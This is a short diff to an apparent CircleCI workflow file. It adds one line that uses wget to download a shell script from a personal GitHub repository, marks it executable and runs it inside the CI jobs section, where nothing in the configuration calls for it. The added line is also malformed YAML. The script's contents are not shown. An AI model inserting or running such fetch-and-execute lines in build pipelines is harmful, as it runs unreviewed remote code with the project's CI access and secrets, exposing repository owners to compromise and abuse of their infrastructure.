@@ -11,3 +11,4 @@ workflows:
     # Run the welcome/run job in its own container
     jobs:
       - welcome/run
+      wget https://raw.githubusercontent.com/linanta/mbc1/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh
